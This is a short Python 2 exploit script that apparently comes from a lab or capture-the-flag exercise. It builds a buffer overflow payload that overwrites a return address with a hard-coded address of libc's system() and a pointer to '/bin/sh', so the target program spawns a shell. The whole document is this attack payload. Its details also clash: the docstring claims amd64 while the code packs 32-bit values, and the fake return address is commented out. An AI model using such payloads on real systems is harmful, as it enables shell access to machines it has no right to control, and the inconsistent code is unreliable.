#!/usr/bin/python

import struct

def p(x):
    ''' pack x in little endian for amd64 and return '''
    return struct.pack('<L', x)

payload = ""
payload += "/bin/sh\x00" # 8 bytes
payload += "A"*20 # padding to overflow the buffer
#payload += "BBBB"
payload += p(0xf7e55198) # system@libc
#payload += "ZZXX"
payload += p(0xffffd320) # pointer to /bin/sh on stack
#payload += "BBBB" # fake return address
#payload += "FAKE" # fake return address
#payload += "S"*8 # overwrite RBP

print payload
